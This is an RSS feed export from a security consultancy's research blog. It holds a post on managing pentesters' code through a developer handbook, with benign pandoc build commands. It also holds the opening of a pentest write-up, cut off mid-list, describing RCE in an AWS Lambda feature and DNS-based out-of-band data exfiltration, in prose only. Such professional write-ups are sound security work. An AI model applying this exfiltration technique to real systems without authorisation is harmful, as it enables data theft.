<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Research</title>
    <link>//localhost:1313/categories/research/</link>
    <description>Recent content in Research on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Tue, 06 Aug 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/research/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>How to Handle Development Projects in a Pentest Company</title>
      <link>//localhost:1313/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/</link>
      <pubDate>Tue, 06 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/stallions.gif&#34; title=&#34;stallions&#34; alt=&#34;stallions&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;stallions&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;If you are a pentester you probably never really think about programming. Instead you are testing what others have developed. However, every now and then a quick python or bash script is needed to exploit some stuff you have found, or automate a certain process you are using. &lt;/p&gt;
&lt;p&gt;Things become interesting when you are in a penetration testing company that has many strong penetration testers and everyone writes these scripts. Clearly each script solves a particular problem, either for the tester or the team. So how do we ensure, that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;No time is wasted on writing the same scripts others have already written&lt;/li&gt;
&lt;li&gt;We keep the knowledge available when team members leave the business&lt;/li&gt;
&lt;li&gt;Ensure that any code is understandable for everyone&lt;/li&gt;
&lt;li&gt;Ensure that the knowledge in regards to the script is preserved for others to use.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The more scripts that are written, the more knowledge goes into code. Code needs maintenance. Suddenly we find ourselves in the same situation as any other software development company. With a difference though, the life expectancy for a script is often just for a single project that lasts up to one month. Meaning, the code goes into hibernation, people forget about it or someone might remember it eight months later on another project. What you might end up with is an unmaintained self hosted gitlab instance with 200 projects, that no one knows anything about. What makes it even more chaotic is the usage of different languages that testers are comfortable with. Some might have a stronger background in Ruby, some really like using Golang. Others might write Typescript instead of Javascript. Don’t forget about Rust, all the C languages and maybe even some good old PHP. &lt;/p&gt;
&lt;p&gt;I want to share my knowledge about these issues and how we tackle them at JUMPSEC. We are fortunate enough to have a dedicated development team given we work on larger projects, such as our proprietary solution that is the backbone to our Continuous Attack Surface Management service. &lt;/p&gt;
&lt;h1&gt;Understanding the basics&lt;/h1&gt;&lt;p&gt;Before we tackle anything, we must understand the root cause for any problem. You might want to skip this section and jump straight into the solution areas below as this is non technical and very dry. &lt;/p&gt;
&lt;p&gt;At the very top, we should understand how important development is and understand the differences and challenges a penetration testing company has. &lt;/p&gt;
&lt;p&gt;In general, a developer gets paid to work on a product that solves a problem for a customer. They do not get paid to write code, as plenty of juniors might think. A penetration tester is getting paid to write a report that outlines the security issues a client has. In the background a developer must write code to make their product usable, while a security expert chooses to make use of programming to help with a certain problem (but might never need to). &lt;/p&gt;
&lt;p&gt;If we look at this from a very high level, it should be clear that a developer has much more experience handling code, compared to a general security researcher, simply due to the time they spend on programming. There are of course exceptions, where you have a team member that moved from development to cyber security in their professional career. But remember, you are only as strong as the weakest link. &lt;/p&gt;
&lt;p&gt;Which brings us directly to the &lt;em&gt;people problem&lt;/em&gt;. It is already difficult to find new employees for a penetration testing company. The pool of experts is small and there is a worldwide shortage. Why would one make the pool even smaller, by requiring from a potential candidate that they know 10 different programming languages that might be used within the business? &lt;/p&gt;
&lt;p&gt;This brings us to some very important and specific requirements for our solution: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We must define what programming languages are used amongst the team&lt;/li&gt;
&lt;li&gt;Our solution cannot prohibit us from reducing the number of candidates &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lets focus on the level of expertise and what we do with the weakest link and the most experienced developer on our pentest team. &lt;/p&gt;
&lt;p&gt;Generally, from my experience, penetration testers are not shy to play around with technology and are not afraid to break things. It is kinda part of the job description. So setting up a new environment for a project, like a C2 infrastructure is not really scarce. &lt;/p&gt;
&lt;p&gt;However, the approach between a developer, possibly with fullstack and devops experience, will differ from that of a security researcher. &lt;/p&gt;
&lt;p&gt;I believe in the year 2024 it is basic knowledge to set up stuff with docker and docker compose. However, I also think that it is not common to know your way around k8s, minicube and helm. Let alone I would never expect a pentester to be able to setup a full infrastructure as code project with Terraform, Ansible and Azure. Most certainly, not in an ad hoc situation for an adversarial simulation or similar pentest project. &lt;/p&gt;
&lt;p&gt;What if some members of the team are able to do that though? Well, the moment you start deploying projects in a very professional manner with lots of experience behind it, it becomes only manageable by the people that have that experience and exposure to the project. In other words, if your person leaves the business you start to have an unknown skeleton on your infrastructure, in some cases people might not even be able to login because of missing SSH keys. &lt;/p&gt;
&lt;p&gt;This brings us to the requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Technology used must be easy to learn and should not require lots of specialised expertise&lt;/li&gt;
&lt;li&gt;Must have the resources to onboard new team members quickly&lt;/li&gt;
&lt;li&gt;The goal must be that everyone in the business is able to jump on the maintenance call and get stuff solved&lt;/li&gt;
&lt;li&gt;Do not become dependent on a single person in the business&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;The solution&lt;/h1&gt;&lt;p&gt;As we know from security and specifically ISO 27001 certifications, it&amp;rsquo;s all fine and great to have documents everywhere, but unless it really becomes the culture of the business, documents are useless. &lt;/p&gt;
&lt;p&gt;Unfortunately, we won’t be able to make it a culture without a document that clearly defines some processes and gives guidance to new members quickly. &lt;/p&gt;
&lt;p&gt;Quite frankly, a very well written document can speed up many different areas. &lt;/p&gt;
&lt;p&gt;Let’s call this document The Developer Handbook. &lt;/p&gt;
&lt;p&gt;If you have a look around the internet you will find many guides on how to write one. I would like to share with you our, real &amp;amp; currently in use, developer handbook. Furthermore, I will go into some details of some sections going forward. &lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s look into the sections that I believe are required for a successful document.&lt;/p&gt;
&lt;h2&gt;Format &amp;amp; Location&lt;span class=&#34;absolute -mt-20&#34; id=&#34;format--location&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#format--location&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Documentation for development projects quickly gets outdated, let&amp;rsquo;s start by hosting it on Github and writing it in markdown, so any IDE / text editor can handle it. &lt;/p&gt;
&lt;p&gt;Versioning is also taken care of by working with git. After all, everyone that does coding should be familiar with some version control system. &lt;/p&gt;
&lt;p&gt;We will use pandoc to convert the markdown to a PDF version, and in fact an HTML version as well. &lt;/p&gt;
&lt;h2&gt;Section 1 - Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-1---introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-1---introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This section should cover the purpose of the document. Making it clear why people should read it and what the overall expectations are (both for the document and the users).&lt;/p&gt;
&lt;h2&gt;Section 2- Code of Conduct&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-2--code-of-conduct&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-2--code-of-conduct&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As we are often building tools that make you think “what if this gets into the wrong hands”, we should remind ourselves why we do it. At the end of the day we are professional researchers that focus on security related subjects. The tools we write are there to make software behave in unintended ways, exploit vulnerabilities or make our life easier. &lt;/p&gt;
&lt;h2&gt;Section 3 - Defining Programming Languages&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-3---defining-programming-languages&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-3---defining-programming-languages&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In this section we should emphasise on our ability and set some limits. Sure it&amp;rsquo;s fun to explore new programming languages as a technical person. Frink, Rebol and Forth languages might look interesting during a weekend, but how many other people in the team could help out with those code bases? How quickly can issues be resolved by falling back to Stackoverflow and Google? Just because AI can help you with it, doesn’t mean it makes sense to use it in a business context. Keep those things to personal projects and find a common language everyone feels comfortable with. Usually that is: bash scripting, Python, sometimes Golang and lately more and more people are getting into Rust. &lt;/p&gt;
&lt;h2&gt;Section 4 - Code Styles&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-4---code-styles&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-4---code-styles&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This one is probably the most overlooked subject of all. However, it is incredibly useful &amp;amp; helpful to define a coding style for the entire team. It helps a lot, when everyone follows the same code style and no one needs to “adjust their way of reading”. &lt;/p&gt;
&lt;h2&gt;Section 5 - Editors&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-5---editors&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-5---editors&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Isn’t everyone on Sublime these days? Ah no, Atom looked so much nicer. What about Netbeans, PHPStorm, Eclipse (eh), vim, nano.  Well, and then there is VSCode. &lt;/p&gt;
&lt;p&gt;At the end of the day it doesn’t really matter which editor you use to write code in. What is more important is the set of features it can provide you to save time by automating tasks, such as formatting code to your set coding style. &lt;/p&gt;
&lt;p&gt;We went with VSCode. It is available in various “editions”, what matters for us is the extension ecosystem. We make heavy use of mypy, formatting and automated docstrings. solved within the editor and not just via pre-commit.&lt;/p&gt;
&lt;p&gt;If you are using VSCode, this would also be a good place to have specific configurations shared, including default configurations for developer containers.&lt;/p&gt;
&lt;h2&gt;Section 6 - Version Control&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-6---version-control&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-6---version-control&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First of all you want to specify what version control system you want to use. Whether it is git or svn. However, it is more important that this section can help as a “tutorial” on some processes. Sure you would expect everyone to know “git clone”, “git pull”, “git add” and “git commit”. But how about merging? Is this something you expect every consultant to know? What about the language of git? Staging &amp;amp; Stashing are probably the easiest ones. However, never assume that everyone is on the same page as you are. Specifically with development, things can go wrong or be done in many different ways. How do we delete files from the git history again so we don’t expose some secrets? Should we squash and if so when? How to do things and when to do them, without going over the entire git manual is probably a good starting point for this section.&lt;/p&gt;
&lt;h2&gt;Section 7 - Project Setup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-7---project-setup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-7---project-setup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The project setup section should cover a few things such as how a project should be structured both in terms of files, how dependencies are managed, what type of files are required. Best practices for public Github repositories, and generally how a project should be managed. &lt;/p&gt;
&lt;p&gt;Given that we are in a git environment, why not create an example project folder as well? &lt;/p&gt;
&lt;h2&gt;Section 8 - Testing&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-8---testing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-8---testing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are many types of tests that can be written for any software project. Most likely performance tests are not the most important ones for pentesting software. However, this section should give some guidelines on what is expected and what testing suite should be used. &lt;/p&gt;
&lt;p&gt;It can also explain how to set up testing in a new project. How to use setUp and tearDown methods. &lt;/p&gt;
&lt;h2&gt;Section 9 - CI &amp;amp; CD&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-9---ci--cd&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-9---ci--cd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Not every project needs a CI/CD process, however, whenever there is one it is imperative that certain actions are being executed. The section should talk about some limits in terms of resources to the company (not everyone has Github Enterprise with thousands of hours of worker times). Which workers should be used, what the authentication process looks like and how images need to be tagged.&lt;/p&gt;
&lt;h2&gt;Section 10 - Documentation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-10---documentation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-10---documentation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We are entering the inception phase with this one. Writing documentation and guidelines on how to document projects. However, it is a very important subject, as documentation often gets outdated very quickly. &lt;/p&gt;
&lt;p&gt;There are some solutions, such as self explaining code, building documentation automatically based on docstrings, comments etc. Rather than writing a handbook for each project, the time should be spent on the quality of the project. There might be a specific process that is involved to create documentation files automatically within the CI/CD as new versions are published. &lt;/p&gt;
&lt;h2&gt;Section 11 - Security&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-11---security&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-11---security&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Every programming language has some pitfalls. Specifically junior developers might fall for them. An obvious one might be the concatenation of strings rather than using f-strings. There are however many more and often some sort of approach or “library” should be established by developers within your company. Often code is reused, copy &amp;amp; pasted into new projects and simply adjusted. How do we check for security issues? What static code analysers should be used? Are there any requirements in the configuration of these? &lt;/p&gt;
&lt;h2&gt;Section 12 - Performance&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-12---performance&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-12---performance&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The performance section is quite an interesting one. Here, it is really up to you how deep you want to go  and how important performance considerations are. They certainly do matter, however, given that as a pentesting company your tools/products don’t serve 100 million end users it makes sense to show some approaches that might be better than introducing more advanced concepts such as multithreaded, multi core, async operations. Of course there are exceptions for certain tools. I suggest not to limit the section to pure technology based performance patterns, but also talk about general performance improvements within coding projects, such as best practices for code maintainability, documentation, dependencies, refactoring and so on.&lt;/p&gt;
&lt;h2&gt;Section 13 - Accessibility&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-13---accessibility&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-13---accessibility&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We kept this section very short. We do not support any accessibility. All tools must be in English, no translations needed. Nor special support for operation systems, screen readers etc. Our tools are not for “real end users”, they are for the tech community and our team. &lt;/p&gt;
&lt;p&gt;However, if you do publish something that goes out to clients or end users, it might make sense to think about this section in more depth. &lt;/p&gt;
&lt;h2&gt;Section 99 - Learning Resources&lt;span class=&#34;absolute -mt-20&#34; id=&#34;section-99---learning-resources&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#section-99---learning-resources&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This is probably the most important section for new team members, junior team members and anyone that is starting on a project. The handbook should provide some valuable links and collections to tutorials and courses that the team can use to understand certain subjects. There is no harm to also link to your own blog posts. &lt;/p&gt;
&lt;h1&gt;Give me a real example&lt;/h1&gt;&lt;p&gt;Now that you have an idea of what sections there should be in a handbook, have a look at ours:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/Developer.Handbook&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/Developer.Handbook&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Final Words&lt;/h1&gt;&lt;p&gt;A developer handbook is a constantly evolving document. The main purpose is to give guidance and contribute to the quality of development related work within a company. It should be adjusted every now and then, and it should never be considered a “finished product”. &lt;/p&gt;
&lt;p&gt;You will need to put the effort in yourself to create something that works for you and your team. This depends completely on the expertise of your team and what is important to your projects. There should be discussions with the team and every team member should be able to make changes to the document (remember section 99).&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h1&gt;Bonus Section&lt;/h1&gt;&lt;h2&gt;Github automation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;github-automation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#github-automation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To give you a bit of technology in this blog post I figured it is best to quickly go over Github actions so that you can automatically generate the latest PDF version of the markdown files which you can then share with your team or store them somewhere for your ISO audit. &lt;/p&gt;
&lt;p&gt;We are using [pandoc](&lt;a href=&#34;https://pandoc.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://pandoc.org/&lt;/a&gt;) to automatically merge the different sections to a PDF. However, we cannot directly make it a PDF, we first must make a final HTML version. &lt;/p&gt;
&lt;p&gt;You can go over each step by reviewing the file: &lt;a href=&#34;https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There are two jobs involved: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Building the final PDF version&lt;/li&gt;
&lt;li&gt;Releasing it under the release tab on Github&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Building a PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;building-a-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#building-a-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We cannot directly go from markdown to PDF with pandoc. Hence we must create an HTML version first. &lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;pandoc -t html --include-before-body=./version.md -s -o developer_handbook.html --toc --number-sections --wrap=none $(cat pandoc_order.txt)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;This command takes all the files and in the same order as specified in the pandoc_order.txt file and converts them into a single standalone html file. &lt;/p&gt;
&lt;p&gt;Mind you, for the HTML version, we also have a css.md file, that allows us to make some nice colouring changes. &lt;/p&gt;
&lt;p&gt;Once we have the HTML version we run the converter to PDF&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;pandoc developer_handbook.html -s --pdf-engine=pdflatex -o developer_handbook.pdf -t pdf -f html&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Have a look at the step “Install pandoc” in case you have issues here.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    - name: Install pandoc
      run: |
        sudo apt-get install texlive-latex-base texlive-latex-extra texlive-fonts-recommended pandoc -y&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We are running this workflow on a base Ubuntu image and therefore need to install the latex package required for the pdf-engine. There are other engines as well, but we had some issues that pandoc did not find. In addition to the base installation some extras are necessary and for good measure we also put the fonts package in there. &lt;/p&gt;
&lt;p&gt;There is an texlive-fonts-extra package for fonts, however that increases the running time for the installing step immensely. &lt;/p&gt;
&lt;p&gt;There is an alternative way of doing this, and it is also documented on the official pandoc website: &lt;a href=&#34;https://pandoc.org/installing.html#github-actions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://pandoc.org/installing.html#github-actions&lt;/a&gt; &lt;/p&gt;
&lt;h3&gt;Releasing the PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;releasing-the-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#releasing-the-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We keep the approach very simple. We have a version.md file which we can update at our own will and bump the version manually. &lt;/p&gt;
&lt;p&gt;If you look closely at the “Extract Version” step in the release job you can see we extract it and later use it to tag our release upload on Github.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;- name: Extract version
      id: extract_version
      run: |
        version=$(grep -oP &amp;#39;Version: \K[0-9]&amp;#43;\.[0-9]&amp;#43;\.[0-9]&amp;#43;&amp;#39; docs/version.md)
        echo &amp;#34;::set-output name=version::$version&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2&gt;Useful VSCode extensions&lt;span class=&#34;absolute -mt-20&#34; id=&#34;useful-vscode-extensions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#useful-vscode-extensions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are only two VSCode extensions I would recommend for this specific project type. &lt;/p&gt;
&lt;h3&gt;Markdown All in One &lt;span class=&#34;absolute -mt-20&#34; id=&#34;markdown-all-in-one&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#markdown-all-in-one&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This one should be a no-brainer to everyone. However, did you know it can generate a table of contents for you? Open the command palette and run the command “&lt;strong&gt;Create Table of Contents”.&lt;/strong&gt; &lt;/p&gt;
&lt;h3&gt;Markdown as PDF&lt;span class=&#34;absolute -mt-20&#34; id=&#34;markdown-as-pdf&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#markdown-as-pdf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This one is a nice one if you want to create a quick PDF out of an MD file.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>What’s in a Name? Writing custom DNS tunnelling protocol, exploiting unexpected AWS Lambda misconfiguration – in a web app Pen test (Part 2)</title>
      <link>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</link>
      <pubDate>Thu, 13 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/06/2024-06-13-whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/unnamed.gif&#34; title=&#34;unnamed&#34; alt=&#34;unnamed&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;unnamed&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Part 1&lt;/a&gt; of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user - sbx_userNNN.&lt;/p&gt;
&lt;p&gt;In the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the &amp;ldquo;sbx_u&amp;rdquo; string was the first clue that the function I popped was powered by a Lambda.&lt;/p&gt;
&lt;p&gt;Screenshot showing decoding results of whoami:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1 1&#34; alt=&#34;pic1 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2 1&#34; alt=&#34;pic2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite&amp;rsquo;s Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic8.png&#34; title=&#34;pic8&#34; alt=&#34;pic8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Scalability &amp;amp; UX - I didn&amp;rsquo;t know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total - need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
